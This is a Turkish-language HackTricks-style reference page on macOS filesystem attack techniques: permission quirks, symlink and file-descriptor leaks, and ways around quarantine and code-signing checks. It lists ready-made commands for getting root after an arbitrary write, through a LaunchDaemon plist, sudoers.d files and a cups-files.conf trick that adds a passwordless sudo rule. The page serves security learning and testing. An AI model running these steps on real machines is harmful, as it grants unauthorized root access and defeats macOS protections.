# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

Bir **directory** için üç izin biti, normal bir dosyadaki anlamlarından farklıdır. `chmod(1)`, bir directory'ye uygulandığında execute bit'ini "**search**" olarak adlandırır:<sup>[[2]](#references)</sup>

> `0100` Dosyalar için owner tarafından çalıştırmaya izin verir. Directory'ler için owner'ın directory içinde **search** yapmasına izin verir.

- **read** - directory girişlerini **enumerate** edebilirsiniz (adları listeleyebilirsiniz).
- **write** - directory içinde girişler **create, rename and delete** edilebilir. Bunun *containing* directory'nin bir özelliği olduğunu unutmayın; dosyanın değil: okuyamadığınız veya yazamadığınız bir dosyayı, parent directory'sine yazabiliyorsanız silebilirsiniz.
- Bir **subdirectory**'yi silmek için boş olması gerekir; bu da içindeki her şeyi kaldırmak için yeterli haklara sahip olmayı gerektirir.
- Directory'de **sticky bit** (`S_ISVTX`, `/tmp` gibi) varsa bu işlem kısıtlanır — POSIX, bir process'in bu durumda dosyaları yalnızca dosyanın owner'ı, directory'nin owner'ı veya uygun ayrıcalıklara sahipse silip yeniden adlandırabileceğini belirtir.<sup>[[1]](#references)</sup>
- **execute / search** - directory'yi **traverse** etmenize izin verilir. Pathname resolution, her bileşeni "kendinden önceki tarafından belirtilen directory içinde" bulur; bu nedenle path prefix'in herhangi bir bileşeninde **search** haklarını kaybetmek, leaf file'ın kendisi world-readable olsa bile, altındaki her şeyi path üzerinden erişilemez hale getirir.<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root tarafından sahip olunan bir file/folder'ın nasıl overwrite edileceği**, ancak:

- Path içindeki bir parent **directory owner** kullanıcıdır
- Path içindeki bir parent **directory owner**, **write access** sahibi bir **users group**'udur
- Bir users **group**, **file** üzerinde **write** erişimine sahiptir

Önceki kombinasyonlardan herhangi biriyle saldırgan, ayrıcalıklı arbitrary write elde etmek için beklenen path'e bir **sym/hard link** **inject** edebilir.

### Folder root R+X special case

Bu durum, yukarıdaki pathname-resolution kuralının doğrudan bir sonucudur. Bir **directory** yalnızca root'a R+X veriyorsa, içindeki dosyalara diğer herkes için *path üzerinden* erişilemez — ancak **files'** kendi permission bit'leri yine de permissive olabilir. Engel oluşturan tek şey directory'dir.

Dolayısıyla dosyayı bu directory'den **out** etmenizi sağlayan herhangi bir primitive — saldırganın seçtiği bir path'i sizin **traverse** edebileceğiniz bir konuma **moves/renames/copies** eden ayrıcalıklı bir process — dosyanın kendi mode'unu aşmanız hiç gerekmeden arbitrary read'e dönüşür:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Daha düşük ayrıcalıklara sahip bir kullanıcıdan kaynak yolu kabul eden ayrıcalıklı dosya taşıyıcılarını (installers, log rotators, crash/diagnostic collectors, backup ve "export" özellikleri) arayın.

## Symbolic Link / Hard Link

### İzinleri geniş dosya/klasör

Ayrıcalıklı bir process, daha düşük ayrıcalıklara sahip bir kullanıcı tarafından **kontrol edilebilen** veya daha düşük ayrıcalıklara sahip bir kullanıcı tarafından **önceden oluşturulabilen** bir **dosyaya** veri yazıyorsa. Kullanıcı, Symbolic veya Hard link aracılığıyla dosyayı başka bir **dosyaya yönlendirebilir** ve ayrıcalıklı process bu dosyaya yazacaktır.

Bir saldırganın **ayrıcalıkları yükseltmek için rastgele bir yazma işlemini kötüye kullanabileceği** diğer bölümleri kontrol edin.

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) uyarınca: *"`O_NOFOLLOW` maskede kullanılırsa ve `open()`'a geçirilen hedef dosya bir symbolic link ise `open()` başarısız olur."* Yalnızca **son** bileşen kontrol edilir — her **ara** bileşen hâlâ çözümlenir ve takip edilir. Bu nedenle `O_NOFOLLOW` ile yazma işlemini "koruyan" bir geliştirici, hedef yolun herhangi bir **üst dizinine** bir symlink yerleştirilerek yine de saldırıya uğrayabilir.<sup>[[3]](#references)</sup>

Aynı man page bu açığı gerçekten kapatan flag'leri belgeler:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"eğer ... `open()`'a geçirilen yolun herhangi bir bileşeni bir symbolic link ise `open()` başarısız olur."*
- **`O_RESOLVE_BENEATH`** — *"eğer ... belirtilen yol çözümlemesi fd ile ilişkilendirilmiş dizinin dışına çıkarsa `openat()` başarısız olur."*

Aksi hâlde, daha önce doğruladığınız bir dizin FD'sine göreli `openat()` kullanmak veya `realpath()` + yeniden doğrulama yapmak, yolun ortasında gerçekleşen symlink değişimlerini durdurmanın kalan yollarıdır.

## .fileloc

**`.fileloc`** uzantılı dosyalar diğer application'lara veya binary'lere işaret edebilir; böylece açıldıklarında application/binary çalıştırılır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

`open` çağrısında `O_CLOEXEC` flag'i yoksa file descriptor child process tarafından devralınır. Bu nedenle privileged bir process privileged bir file açar ve attacker'ın kontrolündeki bir process'i çalıştırırsa attacker **privileged file üzerindeki FD'yi devralır**.

Bunun canonical örneği **OS X 10.10'daki `DYLD_PRINT_TO_FILE` LPE**'dir ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld`, ilgili variable `processDyldEnvironmentVariable()` dışında parse edildiği için **restricted (suid root) binaries** içinde bile `DYLD_PRINT_TO_FILE=/path` değerini kabul ediyordu.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` çağrısını yaptı; böylece **rastgele bir path'te root-owned file oluşturdu**.
- FD **hiçbir zaman kapatılmadı ve close-on-exec flag'ine sahip değildi**; bu nedenle suid binary'nin her child process'i **root-owned file'a writable FD** devraldı.
- Örneğin `DYLD_PRINT_TO_FILE=/etc/target suid_binary` çalıştırıp ardından child process içindeki devralınan FD numarasını okumak arbitrary root-owned writes sağladı; `fcntl(fd, F_SETFL, 0)` ise `O_APPEND` değerini temizleyerek append yerine overwrite yapılmasına bile izin verdi.

Aynı durum, privileged bir process `exec` ile kontrol ettiğiniz bir şeyi çalıştırmadan **önce** bir file açtığında ortaya çıkar (helper tools, `$EDITOR` üzerinden çağrılan `crontab`-style editors, env-var path'ten açılan log/debug files...). Devraldığınız FD'leri şu komutla enumerate edin:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Kendiniz açamadığınız bir dosyaya işaret eden `2` üzerindeki her şey, arbitrary-write (veya arbitrary-read) primitive'dir.

## quarantine xattrs tricks'ten kaçının

### Kaldırın
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Bir dosya/klasör bu immutable attribute'a sahipse üzerine xattr eklemek mümkün olmaz.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr desteği olmayan dosya sistemleri

macOS'un bağlayabildiği her dosya sistemi **extended attributes**'ı yerel olarak saklamaz. HFS+ ve APFS bunu destekler; **FAT32, exFAT ve (çoğu) NFS mount'u desteklemez** — macOS bunları `._<filename>` adlı bir **AppleDouble** yan dosyası yazarak emüle eder ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Bu, quarantine açısından önemlidir; çünkü xattr yalnızca aynı volume üzerinde gerçekten yazılabiliyor **ve geri okunabiliyorsa** korunur:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
If volume daha sonra `._` companion dosyasını yok sayan bir path üzerinden okunursa (veya companion dosyası kaldırılır/silinirse), dosya **quarantine flag olmadan** gelir — ve quarantine uygulanmamış bir `.app`, [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) bölümünde açıklandığı üzere App Sandbox'tan kaçmak için yeterlidir.

### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, bir dosyayı ACE'leriyle birlikte kopyalar.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin gösteriminin sıkıştırması açılan dosyaya ACL olarak ayarlanacağını görmek mümkündür. Bu nedenle, bir uygulamayı, diğer xattr'ların üzerine yazılmasını engelleyen bir ACL içeren **AppleDouble** dosya formatıyla bir zip dosyasına sıkıştırırsanız quarantine xattr'ı uygulamaya ayarlanmaz:

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.<sup>[[6]](#references)</sup>

Bunu tekrarlamak için öncelikle doğru acl string'ini elde etmemiz gerekir:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu çalışsa bile sandbox, quarantine xattr'ını önceden yazar)

Gerçekten gerekli değil ama her ihtimale karşı burada bırakıyorum:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## İmza kontrollerini Bypass etme

### Platform binary kontrollerini Bypass etme

Bazı security kontrolleri, örneğin bir XPC service'e bağlanmaya izin vermek için binary'nin bir **platform binary** olup olmadığını kontrol eder. Ancak https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ adresindeki bypass yönteminde gösterildiği üzere, bir platform binary (örneğin /bin/ls) edinip exploit'i dyld aracılığıyla `DYLD_INSERT_LIBRARIES` env variable'ı kullanarak inject ederek bu kontrolü bypass etmek mümkündür.<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` ve `CS_FORCED_LV` flag'lerini Bypass etme

Çalışan bir binary'nin aşağıdaki gibi bir code kullanarak kendi flag'lerini değiştirip kontrolleri bypass etmesi mümkündür:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures Bypass

Bundle'lar, **bundle** içindeki her bir **file**'ın **hash** değerini içeren **`_CodeSignature/CodeResources`** dosyasını barındırır. CodeResources'ın hash değerinin de **executable** içine gömülü olduğunu unutmayın; dolayısıyla buna da müdahale edemeyiz.

Bununla birlikte, imzası kontrol edilmeyecek bazı dosyalar vardır; bunlar plist içinde `omit` anahtarına sahip olan dosyalardır, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Bir kaynağın imzasını CLI üzerinden şu şekilde hesaplamak mümkündür:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmg'leri bağlama

Bir kullanıcı, oluşturduğu özel bir dmg'yi bazı mevcut klasörlerin üzerine bile bağlayabilir. Özel içeriklerle özel bir dmg paketi şu şekilde oluşturulabilir:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Genellikle macOS, `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach service ile iletişim kurarak diskleri mount eder. LaunchDaemons plist dosyasına `-d` parametresini ekleyip yeniden başlatırsanız, logları `/var/log/diskarbitrationd.log` dosyasına kaydeder.\
Ancak `com.apple.driver.DiskImages` kext ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçları kullanmak mümkündür.

## Arbitrary Writes

### Periodic sh script'leri

Script'iniz bir **shell script** olarak yorumlanabiliyorsa, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell script'inin üzerine yazabilirsiniz.

Bu script'in çalıştırılmasını şu komutla **taklit** edebilirsiniz: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi bir **LaunchDaemon** yazın ve plist içinde aşağıdaki gibi arbitrary bir script çalıştırın:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Yalnızca root olarak çalıştırmak istediğiniz **komutları** içeren `/Applications/Scripts/privesc.sh` script'ini oluşturun.

### Sudoers Dosyası

**Arbitrary write** yetkiniz varsa, kendinize **sudo** ayrıcalıkları veren bir dosyayı **`/etc/sudoers.d/`** klasörü içinde oluşturabilirsiniz.

### PATH dosyaları

**`/etc/paths`** dosyası, PATH env değişkenini oluşturan ana konumlardan biridir. Bu dosyanın üzerine yazmak için root olmanız gerekir; ancak **privileged process** tam yolu olmadan bir **command** çalıştırıyorsa, bu dosyayı değiştirerek onu **hijack** edebilirsiniz.

Ayrıca PATH env değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içine dosyalar yazabilirsiniz.

### cups-files.conf

Bu teknik [this writeup](https://www.kandji.io/blog/macos-audit-story-part1) içinde kullanılmıştır.<sup>[[8]](#references)</sup>

Aşağıdaki içeriğe sahip `/etc/cups/cups-files.conf` dosyasını oluşturun:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Bu işlem, izinleri 777 olan `/etc/sudoers.d/lpe` dosyasını oluşturur. Sondaki gereksiz içerik, hata günlüğü oluşturulmasını tetiklemek içindir.

Ardından, `/etc/sudoers.d/lpe` dosyasına `%staff ALL=(ALL) NOPASSWD:ALL` gibi privilege escalation için gereken yapılandırmayı yazın.

Sonra `/etc/cups/cups-files.conf` dosyasını tekrar değiştirerek `LogFilePerm 700` belirtin; böylece yeni sudoers dosyası `cupsctl` çağrıldığında geçerli hale gelir.

### Sandbox Escape

Bir FS arbitrary write ile macOS sandbox'ından kaçmak mümkündür. Bazı örnekler için [macOS Auto Start](../../../../macos-auto-start-locations.md) sayfasına bakın; ancak yaygın yöntemlerden biri, başlangıçta bir command çalıştıran Terminal preferences dosyasını `~/Library/Preferences/com.apple.Terminal.plist` konumuna yazmak ve bunu `open` kullanarak çağırmaktır.

## Diğer kullanıcılar olarak yazılabilir dosyalar oluşturma

Çok yaygın bir privesc primitive, **privileged process'in sizin için kontrol ettiğiniz bir directory'de file oluşturmasını** ve ardından bu file üzerinde **write access** bulundurmaya devam etmektir. Bunun için iki bileşen gerekir:

1. Sahip olduğunuz bir directory (veya **inheritable ACL** ayarlayabildiğiniz bir directory); böylece içeride oluşturulan her şey izinlerinizi devralır.
2. Bir file'ın **nerede** oluşturulacağının söylenebildiği privileged/`suid` bir process — genellikle bir debug/logging environment variable, config file veya helper'ın XPC API'si aracılığıyla.

Oluşturulan file'ın başka bir kullanıcıya ait olmasına rağmen sizin tarafınızdan yazılabilir olmasını sağlayan, **inheritable ACL** kısmıdır. `file_inherit` / `directory_inherit` inheritance flag'leri [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) içinde belgelenmiştir:<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Artık ayrıcalıklı bir process'in `$DIRNAME` içinde oluşturduğu herhangi bir dosya **sizin tarafınızdan yazılabilir**. Bu dizin daha sonra **root olarak çalıştırılan** bir konumsa (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, bir LaunchDaemon dizini...), bu doğrudan bir root yetki yükseltmesidir. Dosyayı elde ettikten sonra içine ne yazmanız gerektiğini görmek için yukarıdaki [Sudoers File](#sudoers-file) ve [cups-files.conf](#cups-filesconf) bölümlerine bakın.

"env variable bir root process'inin dosya oluşturmasını sağlar ve FD size leak olur" zincirinin tamamen uygulanmış bir örneği için yukarıdaki [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) bölümüne bakın.

## POSIX Shared Memory

**POSIX shared memory**, POSIX uyumlu işletim sistemlerindeki process'lerin ortak bir bellek alanına erişmesini sağlar ve diğer inter-process communication yöntemlerine kıyasla daha hızlı iletişim sunar. Bu işlem, `shm_open()` ile bir shared memory object oluşturmayı veya açmayı, boyutunu `ftruncate()` ile ayarlamayı ve `mmap()` kullanarak process'in adres alanına eşlemeyi içerir. Process'ler daha sonra bu bellek alanından doğrudan okuyabilir ve buraya yazabilir. Eşzamanlı erişimi yönetmek ve data corruption'ı önlemek için genellikle mutex veya semaphore gibi synchronization mekanizmaları kullanılır. Son olarak process'ler, `munmap()` ve `close()` ile shared memory'nin eşlemesini kaldırır ve bağlantısını kapatır; isteğe bağlı olarak `shm_unlink()` ile memory object'i kaldırır. Bu sistem, birden fazla process'in paylaşılan dataya hızlıca erişmesi gereken ortamlarda verimli ve hızlı IPC için özellikle etkilidir.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Consumer Code Example</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**, kullanıcı uygulamalarındaki **file descriptor operations** işlemlerinin güvenliğini ve güvenilirliğini artırmak amacıyla macOS'ta sunulan bir security feature'dır. Bu guarded descriptors, file descriptor'larla belirli kısıtlamaları veya kernel tarafından uygulanan "guard"ları ilişkilendirme olanağı sağlar.

Bu özellik, **unauthorized file access** veya **race conditions** gibi belirli security vulnerabilities sınıflarını önlemek için özellikle kullanışlıdır. Bu vulnerabilities, örneğin bir thread'in bir file description'a erişerek **başka bir vulnerable thread'in buna erişmesini sağlaması** ya da bir file descriptor'ın **vulnerable child process** tarafından miras alınması durumunda ortaya çıkar. Bu functionality ile ilgili bazı functions şunlardır:

- `guarded_open_np`: Bir FD'yi guard ile açar
- `guarded_close_np`: Kapatır
- `change_fdguard_np`: Bir descriptor üzerindeki guard flags'i değiştirir (guard protection'ı kaldırmak dahil)

## References

- [1] [POSIX.1-2024 — Temel Tanımlar, Bölüm 4 (Dosya Erişim İzinleri, Dizin Koruması, Yol Adı Çözümlemesi)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man sayfası](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man sayfası](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Hangi file systems ve cloud services extended attributes'ı korur?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: macOS vulnerability'sini ortaya çıkarmak](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - macOS Sandbox Escapes'te Yeni Bir Dönem](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Apple Vulnerabilities'ı Ortaya Çıkarmak: diskarbitrationd ve storagekitd Audit Hikayesi, Bölüm 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
